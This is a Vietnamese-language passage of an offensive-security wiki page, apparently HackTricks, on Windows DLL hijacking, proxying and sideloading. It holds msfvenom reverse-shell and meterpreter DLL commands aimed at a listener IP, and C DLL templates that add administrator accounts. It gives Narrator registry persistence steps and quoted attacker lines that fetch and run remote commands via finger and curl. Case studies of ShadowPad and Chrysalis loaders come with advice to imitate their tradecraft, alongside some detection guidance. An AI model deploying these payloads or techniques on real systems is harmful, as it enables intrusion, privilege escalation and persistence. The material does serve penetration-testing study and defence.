writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Công cụ tự động

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sẽ kiểm tra xem bạn có quyền ghi vào thư mục nào trong system PATH hay không.\
Các công cụ tự động thú vị khác để phát hiện lỗ hổng này là các hàm **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ và _Write-HijackDll._

### Ví dụ

Nếu phát hiện một tình huống có thể khai thác, một trong những việc quan trọng nhất để khai thác thành công là **tạo một dll export ít nhất tất cả các hàm mà executable sẽ import từ dll đó**. Tuy nhiên, lưu ý rằng DLL Hijacking rất hữu ích để [leo thang từ mức Medium Integrity lên High **(bypass UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) hoặc từ[ **High Integrity lên SYSTEM**](../index.html#from-high-integrity-to-system)**.** Bạn có thể xem ví dụ về **cách tạo một dll hợp lệ** trong bài nghiên cứu DLL hijacking tập trung vào DLL hijacking để thực thi: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ngoài ra, trong **phần tiếp theo** có một số **đoạn code dll cơ bản** có thể hữu ích làm **template** hoặc để tạo **dll export các hàm không bắt buộc**.

## **Tạo và biên dịch DLL**

### **Tạo DLL proxy**

Về cơ bản, **DLL proxy** là một DLL có khả năng **thực thi mã độc của bạn khi được load**, đồng thời **expose** và **hoạt động** như **mong đợi** bằng cách **chuyển tiếp mọi lời gọi đến thư viện thật**.

Với công cụ [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) hoặc [**Spartacus**](https://github.com/Accenture/Spartacus), bạn có thể **chỉ định một executable và chọn thư viện** muốn tạo proxy, rồi **tạo một dll proxy**; hoặc **chỉ định DLL** và **tạo một dll proxy**.

### **Meterpreter**

**Lấy rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Lấy một meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Tạo người dùng (x86, tôi không thấy phiên bản x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Tự tạo

Trong nhiều trường hợp, DLL bạn biên dịch phải **export mọi hàm mà tiến trình mục tiêu import**. Nếu thiếu một export bắt buộc, binary không thể phân giải hàm đó và exploit sẽ thất bại.

<details>
<summary>Mẫu DLL C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Ví dụ DLL C++ tạo người dùng</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C thay thế với entry của thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL NativeAOT với khởi tạo được kích hoạt qua export

Một **thư viện chia sẻ .NET NativeAOT tự chứa** có thể được dùng làm DLL native được cài vào mà không cần triển khai `DllMain` tường minh. Export các phương thức C# static bằng `[UnmanagedCallersOnly(EntryPoint = "...")]`; khi host native gọi một trong các entry point do compiler tạo ra này, NativeAOT sẽ khởi tạo module và phương thức `[ModuleInitializer]` chạy trước phần thân C# được export. Đầu ra không cần cài đặt riêng .NET runtime.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL vẫn cần **tên export và chữ ký tương thích ABI** mà host được chọn thực sự gọi. Các stub tối giản có thể đủ để kích hoạt khởi tạo, nhưng thiếu export có thể khiến không tải được DLL, còn chữ ký không chính xác có thể làm hỏng lời gọi. Liệt kê các import của host và xác thực kết quả bằng `dumpbin /exports payload.dll` trước khi đổi tên đầu ra thành tên dependency mà host mong đợi.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>DLL export NativeAOT tối giản</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Cấu hình dự án thành một thư viện dùng chung native Windows độc lập:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Đặt DLL đã đổi tên cạnh executable dễ bị tấn công đã sao chép và khởi chạy host thông qua đường dẫn mã gọi export tương thích. Cách tiếp cận bằng initializer này tránh đặt các thao tác phức tạp trực tiếp trong `DllMain`, nhưng các điều kiện tiên quyết của sideload vẫn không đổi: loader phải phân giải dependency theo tên, chọn thư mục ứng dụng và không tìm thấy dependency trước đó thông qua KnownDLLs, module đã được tải, chuyển hướng SxS hoặc các cờ `LOAD_LIBRARY_SEARCH_*` bị giới hạn.<sup>[[26]](#references)[[30]](#references)</sup>

Để xem các template native thông thường, hãy tham khảo [Windows C payloads](../windows-c-payloads.md). Một first stage được sideload có thể thực hiện [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) sau đó, nhưng đây là một kỹ thuật injection riêng, không phải một phần của quá trình phân giải DLL.

## Phát hiện: Tải thư viện DLL giả mạo

Elastic Defend 9.5.0 bổ sung thông tin vào sự kiện tải thư viện với `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` khi file được tải không có chữ ký của Microsoft và tên file trùng với danh sách kiểm kê DLL Windows/hệ thống được Elastic lưu trong bộ nhớ đệm. Việc này chuyển phân tích danh sách tên file, vị trí hệ thống và chữ ký sang sensor endpoint; do đó, EQL cốt lõi có thể được rút gọn thành:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Treat enrichment as a high-value pivot, not proof by itself. Increase confidence when a signed host loads the DLL from its own **user-writable** directory, the DLL is unsigned/untrusted, and `dll.Ext.relative_file_creation_time` shows it was created shortly before loading. Limit exclusions to the exact publisher + host process + installation path; do not suppress a colliding DLL name globally, because legitimate installers and applications may ship private libraries with system-like names.<sup>[[26]](#references)</sup>

On sensors without that enrichment, approximate the behavior by correlating a colliding DLL name with a non-system load path, an absent/untrusted Microsoft signature, and a short file-create-to-load interval. This requires a maintained DLL-name inventory and narrow exclusions for `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS`, and other approved deployment paths.<sup>[[26]](#references)</sup>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe vẫn dò tìm một DLL localization theo ngôn ngữ có đường dẫn dễ đoán khi khởi động; DLL này có thể bị hijack để thực thi mã tùy ý và duy trì quyền truy cập.<sup>[[7]](#references)</sup>

Thông tin chính
- Đường dẫn dò tìm (các bản build hiện tại): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Đường dẫn cũ (các bản build trước đây): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Nếu có DLL do attacker kiểm soát và có thể ghi vào tại đường dẫn OneCore, DLL đó sẽ được tải và `DllMain(DLL_PROCESS_ATTACH)` sẽ thực thi. Không cần export nào.

Phát hiện bằng Procmon
- Bộ lọc: `Process Name is Narrator.exe` và `Operation is Load Image` hoặc `CreateFile`.
- Khởi động Narrator và quan sát lần tải thử tại đường dẫn ở trên.

DLL tối thiểu
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC yên lặng
- Một hijack ngây thơ sẽ phát tiếng/hiển thị giao diện. Để hoạt động kín đáo, khi attach, hãy liệt kê các thread của Narrator, mở thread chính (`OpenThread(THREAD_SUSPEND_RESUME)`) rồi `SuspendThread` thread đó; tiếp tục trên thread của bạn. Xem PoC để biết toàn bộ mã.<sup>[[8]](#references)</sup>

Kích hoạt và duy trì qua cấu hình Accessibility
- Ngữ cảnh người dùng (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Với cấu hình trên, khi khởi động Narrator, DLL đã cài sẽ được tải. Trên secure desktop (màn hình đăng nhập), nhấn CTRL+WIN+ENTER để khởi động Narrator; DLL của bạn thực thi với quyền SYSTEM trên secure desktop.

Thực thi SYSTEM được kích hoạt qua RDP (di chuyển ngang)
- Cho phép lớp bảo mật RDP cổ điển: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP đến máy chủ, tại màn hình đăng nhập nhấn CTRL+WIN+ENTER để khởi chạy Narrator; DLL của bạn thực thi với quyền SYSTEM trên secure desktop.
- Việc thực thi dừng khi phiên RDP đóng—hãy inject/migrate kịp thời.

Bring Your Own Accessibility (BYOA)
- Bạn có thể sao chép một mục registry của Accessibility Tool (AT) tích hợp sẵn (ví dụ: CursorIndicator), chỉnh sửa để trỏ đến một binary/DLL tùy ý, import mục đó, rồi đặt `configuration` thành tên AT đó. Cách này chuyển tiếp việc thực thi tùy ý thông qua framework Accessibility.

Ghi chú
- Ghi vào `%windir%\System32` và thay đổi các giá trị HKLM cần quyền admin.
- Toàn bộ logic payload có thể nằm trong `DLL_PROCESS_ATTACH`; không cần export nào.

## Nghiên cứu tình huống: CVE-2025-1729 - Leo thang đặc quyền bằng TPQMAssistant.exe

Nghiên cứu này minh họa **Phantom DLL Hijacking** trong TrackPoint Quick Menu của Lenovo (`TPQMAssistant.exe`), được theo dõi dưới mã **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Chi tiết lỗ hổng

- **Thành phần**: `TPQMAssistant.exe`, nằm tại `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` chạy hằng ngày lúc 9:30 AM trong ngữ cảnh của người dùng đã đăng nhập.
- **Quyền thư mục**: `CREATOR OWNER` có quyền ghi, cho phép người dùng cục bộ thả các file tùy ý vào đó.
- **Hành vi tìm kiếm DLL**: Tiến trình thử tải `hostfxr.dll` từ thư mục làm việc trước và ghi log "NAME NOT FOUND" nếu không tìm thấy, cho thấy thứ tự ưu tiên tìm kiếm thư mục cục bộ.

### Triển khai khai thác

Kẻ tấn công có thể đặt một stub `hostfxr.dll` độc hại trong cùng thư mục, khai thác DLL bị thiếu để thực thi mã trong ngữ cảnh của người dùng:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Luồng tấn công

1. Với tư cách người dùng thông thường, thả `hostfxr.dll` vào `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Chờ tác vụ đã lên lịch chạy lúc 9:30 AM trong ngữ cảnh của người dùng hiện tại.
3. Nếu quản trị viên đang đăng nhập khi tác vụ chạy, DLL độc hại sẽ chạy trong phiên của quản trị viên với mức toàn vẹn trung bình.
4. Kết hợp các kỹ thuật UAC bypass tiêu chuẩn để leo thang từ mức toàn vẹn trung bình lên đặc quyền SYSTEM.

## Nghiên cứu tình huống: MSI CustomAction Dropper + DLL Side-Loading qua Signed Host (wsc_proxy.exe)

Các tác nhân đe dọa thường kết hợp dropper dựa trên MSI với DLL side-loading để thực thi payload dưới một tiến trình đáng tin cậy, đã được ký.<sup>[[10]](#references)</sup>

Tổng quan chuỗi tấn công
- Người dùng tải MSI xuống. Một CustomAction chạy âm thầm trong lúc cài đặt bằng GUI (ví dụ: LaunchApplication hoặc một hành động VBScript), tái tạo giai đoạn tiếp theo từ các tài nguyên được nhúng.
- Dropper ghi một EXE hợp lệ, đã được ký và một DLL độc hại vào cùng thư mục (cặp ví dụ: wsc_proxy.exe do Avast ký + wsc.dll do kẻ tấn công kiểm soát).
- Khi EXE đã ký được khởi chạy, thứ tự tìm kiếm DLL của Windows sẽ ưu tiên tải wsc.dll từ thư mục làm việc, thực thi mã của kẻ tấn công dưới một tiến trình cha đã ký (ATT&CK T1574.001).

Phân tích MSI (cần tìm gì)
- Bảng CustomAction:
  - Tìm các mục chạy tệp thực thi hoặc VBScript. Ví dụ về mẫu đáng ngờ: LaunchApplication thực thi một tệp được nhúng trong nền.
  - Trong Orca (Microsoft Orca.exe), kiểm tra các bảng CustomAction, InstallExecuteSequence và Binary.
- Payload được nhúng/chia nhỏ trong CAB của MSI:
  - Trích xuất bằng chế độ quản trị: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Hoặc dùng lessmsi: lessmsi x package.msi C:\out
  - Tìm nhiều đoạn nhỏ được nối lại và giải mã bằng CustomAction VBScript. Luồng phổ biến:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading với wsc_proxy.exe
- Đặt hai file này trong cùng một thư mục:
  - wsc_proxy.exe: host hợp lệ đã được ký (Avast). Process cố tải wsc.dll theo tên từ thư mục của nó.
  - wsc.dll: DLL của attacker. Nếu không cần export cụ thể nào, chỉ cần DllMain; nếu không, hãy build một proxy DLL và forward các export cần thiết đến thư viện gốc, đồng thời chạy payload trong DllMain.
- Build một payload DLL tối giản:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Với các yêu cầu về export, hãy dùng framework proxy (ví dụ: DLLirant/Spartacus) để tạo forwarding DLL đồng thời thực thi payload của bạn.

- Kỹ thuật này dựa vào việc binary host phân giải tên DLL. Nếu host dùng đường dẫn tuyệt đối hoặc các cờ tải an toàn (ví dụ: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), việc hijack có thể thất bại.
- KnownDLLs, SxS và các export được forward có thể ảnh hưởng đến thứ tự ưu tiên; cần cân nhắc các yếu tố này khi chọn binary host và tập export.

## Bộ ba file đã ký + payload được mã hóa (nghiên cứu tình huống ShadowPad)

Check Point mô tả cách Ink Dragon triển khai ShadowPad bằng **bộ ba file** để hòa lẫn vào phần mềm hợp pháp, đồng thời giữ payload cốt lõi ở trạng thái mã hóa trên ổ đĩa:<sup>[[12]](#references)</sup>

1. **EXE host đã ký** – các nhà cung cấp như AMD, Realtek hoặc NVIDIA bị lợi dụng (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Kẻ tấn công đổi tên executable để trông giống binary Windows (ví dụ: `conhost.exe`), nhưng chữ ký Authenticode vẫn hợp lệ.
2. **Loader DLL độc hại** – được thả cạnh EXE với tên được mong đợi (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL thường là binary MFC được làm rối bằng framework ScatterBrain; nhiệm vụ duy nhất của nó là tìm blob đã mã hóa, giải mã blob rồi ánh xạ ShadowPad theo phương thức reflective.
3. **Blob payload được mã hóa** – thường được lưu dưới dạng `<name>.tmp` trong cùng thư mục. Sau khi ánh xạ payload đã giải mã vào bộ nhớ, loader xóa file TMP để hủy bằng chứng pháp chứng.

Ghi chú về tradecraft:

* Đổi tên EXE đã ký (đồng thời giữ nguyên `OriginalFileName` ban đầu trong PE header) giúp nó giả dạng binary Windows nhưng vẫn giữ chữ ký của nhà cung cấp; vì vậy, hãy bắt chước cách Ink Dragon thả các binary trông như `conhost.exe` nhưng thực chất là tiện ích AMD/NVIDIA.
* Vì executable vẫn được tin cậy, hầu hết các biện pháp kiểm soát allowlisting chỉ cần DLL độc hại của bạn nằm cạnh nó. Tập trung tùy chỉnh loader DLL; thường có thể chạy nguyên trạng tiến trình cha đã ký.
* Bộ giải mã của ShadowPad yêu cầu blob TMP nằm cạnh loader và có quyền ghi để có thể xóa trắng file sau khi ánh xạ. Giữ thư mục có thể ghi cho đến khi payload được tải; khi payload đã ở trong bộ nhớ, có thể xóa file TMP an toàn để bảo đảm OPSEC.

### Chuỗi sideloading dùng LOLBAS stager + archive staging (finger → tar/curl → WMI)

Các operator kết hợp DLL sideloading với LOLBAS để artifact duy nhất trên ổ đĩa do chúng tạo ra là DLL độc hại nằm cạnh EXE đáng tin cậy:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell ẩn chạy `cmd.exe /c`, lấy các lệnh từ Finger server rồi chuyển chúng vào `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` lấy văn bản qua TCP/79; `| cmd` thực thi phản hồi từ server, cho phép operator thay đổi server second stage.

- **Tải xuống/giải nén tích hợp:** Tải archive với phần mở rộng lành tính, giải nén rồi đặt mục tiêu sideload cùng DLL trong một thư mục `%LocalAppData%` ngẫu nhiên:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ẩn tiến trình và theo các redirect; `tar -xf` sử dụng tar tích hợp sẵn của Windows.

- **Khởi chạy WMI/CIM:** Khởi chạy EXE qua WMI để telemetry ghi nhận một tiến trình do CIM tạo ra trong khi EXE tải DLL nằm cùng thư mục:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Hoạt động với các binary ưu tiên DLL cục bộ (ví dụ: `intelbq.exe`, `nearby_share.exe`); payload (ví dụ: Remcos) chạy dưới tên đáng tin cậy.

- **Săn tìm:** Cảnh báo khi `forfiles` xuất hiện cùng lúc với `/p`, `/m` và `/c`; tổ hợp này hiếm gặp ngoài các script quản trị.


## Nghiên cứu tình huống: NSIS dropper + sideload Bitdefender Submission Wizard (Chrysalis)

Một vụ xâm nhập Lotus Blossom gần đây đã lợi dụng chuỗi cập nhật đáng tin cậy để phát tán một dropper đóng gói bằng NSIS, thiết lập DLL sideload cùng các payload chạy hoàn toàn trong bộ nhớ.<sup>[[13]](#references)</sup>

Luồng tradecraft
- `update.exe` (NSIS) tạo `%AppData%\Bluetooth`, đánh dấu thư mục là **HIDDEN**, thả vào đó Bitdefender Submission Wizard `BluetoothService.exe` đã đổi tên, một `log.dll` độc hại và một blob được mã hóa `BluetoothService`, sau đó khởi chạy EXE.
- Host EXE import `log.dll` và gọi `LogInit`/`LogWrite`. `LogInit` mmap-load blob; `LogWrite` giải mã blob bằng stream dựa trên LCG tùy chỉnh (các hằng số **0x19660D** / **0x3C6EF35F**, vật liệu khóa được tạo từ một hash trước đó), ghi đè buffer bằng shellcode dạng plaintext, giải phóng các vùng nhớ tạm và chuyển điều khiển sang shellcode.
- Để tránh IAT, loader phân giải API bằng cách hash tên export với **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, sau đó áp dụng avalanche kiểu Murmur (**0x85EBCA6B**) và so sánh với các hash mục tiêu đã salt.

Shellcode chính (Chrysalis)
- Giải mã một module chính dạng PE bằng cách lặp lại phép cộng/XOR/trừ với khóa `gQ2JR&9;` qua năm lượt, sau đó tải động `Kernel32.dll` → `GetProcAddress` để hoàn tất phân giải import.
- Tái tạo các chuỗi tên DLL trong lúc chạy bằng các phép biến đổi bit-rotate/XOR trên từng ký tự, sau đó tải `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Sử dụng một resolver thứ hai duyệt **PEB → InMemoryOrderModuleList**, phân tích từng bảng export theo các khối 4 byte với phép trộn kiểu Murmur, và chỉ dùng `GetProcAddress` nếu không tìm thấy hash.

Cấu hình nhúng & C2
- Cấu hình nằm trong file `BluetoothService` đã thả tại **offset 0x30808** (kích thước **0x980**) và được giải mã RC4 bằng khóa `qwhvb^435h&*7`, làm lộ URL C2 và User-Agent.
- Beacon tạo profile host phân tách bằng dấu chấm, thêm tiền tố tag `4Q`, sau đó mã hóa RC4 bằng khóa `vAuig34%^325hGV` trước khi gửi qua HTTPS bằng `HttpSendRequestA`. Phản hồi được giải mã RC4 và xử lý bằng một tag switch (`4T` shell, `4V` thực thi process, `4W/4X` ghi file, `4Y` đọc/exfil, `4\\` gỡ cài đặt, `4` liệt kê ổ đĩa/file + các trường hợp truyền theo chunk).
- Chế độ thực thi được kiểm soát bằng tham số CLI: không có tham số = cài đặt persistence (service/Run key) trỏ đến `-i`; `-i` khởi chạy lại chính nó với `-k`; `-k` bỏ qua cài đặt và chạy payload.

Loader thay thế được quan sát
- Cùng vụ xâm nhập đã thả Tiny C Compiler và thực thi `svchost.exe -nostdlib -run conf.c` từ `C:\ProgramData\USOShared\`, với `libtcc.dll` nằm bên cạnh. Mã nguồn C do attacker cung cấp nhúng shellcode, được biên dịch và chạy trong bộ nhớ mà không ghi PE xuống đĩa. Có thể tái tạo bằng:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Giai đoạn biên dịch-và-chạy dựa trên TCC này đã import `Wininet.dll` khi chạy và tải shellcode giai đoạn hai từ một URL hardcode, tạo ra một loader linh hoạt giả dạng quá trình chạy trình biên dịch.

## Signed-host sideloading with export proxying + host thread parking

Một số chuỗi DLL sideloading bổ sung **các biện pháp tăng độ ổn định** để tiến trình host hợp pháp tiếp tục chạy đủ lâu cho các giai đoạn sau được tải đúng cách, thay vì bị crash sau khi DLL độc hại được tải.<sup>[[11]](#references)</sup>

Mẫu đã quan sát
- Đặt một EXE đáng tin cậy cạnh DLL độc hại, sử dụng tên dependency dự kiến như `version.dll`.
- DLL độc hại **proxy mọi export được mong đợi** đến DLL hệ thống thật (ví dụ `%SystemRoot%\\System32\\version.dll`) để quá trình phân giải import vẫn thành công và tiến trình host tiếp tục hoạt động.
- Sau khi được tải, DLL độc hại **vá entry point của host** để luồng chính rơi vào vòng lặp `Sleep` vô hạn, thay vì thoát hoặc chạy các đường mã khiến tiến trình kết thúc.
- Một luồng mới thực hiện công việc độc hại thực sự: giải mã tên hoặc đường dẫn DLL giai đoạn tiếp theo (RC4/XOR là các cách phổ biến), rồi khởi chạy DLL đó bằng `LoadLibrary`.

Vì sao điều này quan trọng
- Proxying DLL thông thường duy trì khả năng tương thích API, nhưng không đảm bảo host tiếp tục chạy đủ lâu cho các giai đoạn sau.
- Đưa luồng chính vào trạng thái chờ bằng `Sleep(INFINITE)` là cách đơn giản để giữ tiến trình đã ký tồn tại trong khi loader giải mã, staging hoặc khởi tạo kết nối mạng trong một luồng worker.
- Chỉ săn tìm `DllMain` đáng ngờ có thể bỏ sót mẫu này nếu hành vi đáng chú ý xảy ra sau khi entry point của host bị vá và một luồng phụ được khởi chạy.

Quy trình tối thiểu
1. Sao chép EXE host đã ký và xác định DLL mà nó phân giải từ thư mục cục bộ.
2. Tạo một DLL proxy export cùng các hàm và chuyển tiếp chúng đến DLL hợp pháp.
3. Trong `DllMain(DLL_PROCESS_ATTACH)`, tạo một luồng worker.
4. Từ luồng đó, vá entry point của host hoặc routine khởi chạy luồng chính để nó lặp lại `Sleep`.
5. Giải mã tên/cấu hình DLL giai đoạn tiếp theo rồi gọi `LoadLibrary` hoặc manual-map payload.

Các hướng điều tra phòng thủ
- Tiến trình đã ký tải `version.dll` hoặc các thư viện phổ biến tương tự từ thư mục ứng dụng của chính chúng thay vì từ `System32`.
- Các bản vá bộ nhớ tại entry point của tiến trình ngay sau khi image được tải, đặc biệt là lệnh nhảy/gọi được chuyển hướng đến `Sleep`/`SleepEx`.
- Các luồng do DLL proxy tạo ra, lập tức gọi `LoadLibrary` trên DLL thứ hai có tên đã giải mã.
- DLL proxy đầy đủ export được đặt cạnh các executable của nhà cung cấp trong các thư mục staging có quyền ghi, chẳng hạn `ProgramData`, `%TEMP%` hoặc đường dẫn giải nén archive.

## References

- [1] [Red Canary – Nhận định tình báo: Tháng 1 năm 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Leo thang đặc quyền bằng TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking trong Windows. Ví dụ C đơn giản.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore triển khai malware mới nhắm vào châu Âu](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Khi DLL Hijack gặp các công cụ hỗ trợ của Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Bản sao kỹ thuật số: Phân tích cấu trúc các chiến dịch giả mạo đang biến đổi, phát tán Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Lợi ích hội tụ: Phân tích các cụm mối đe dọa nhắm vào một chính phủ Đông Nam Á](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Bên trong Ink Dragon: Hé lộ mạng lưới chuyển tiếp và hoạt động nội bộ của một chiến dịch tấn công bí mật](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Phân tích chuyên sâu bộ công cụ của Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Chuỗi HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Theo dõi các chiến dịch gián điệp năm 2026 của APT Screening Serpens thuộc Iran](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
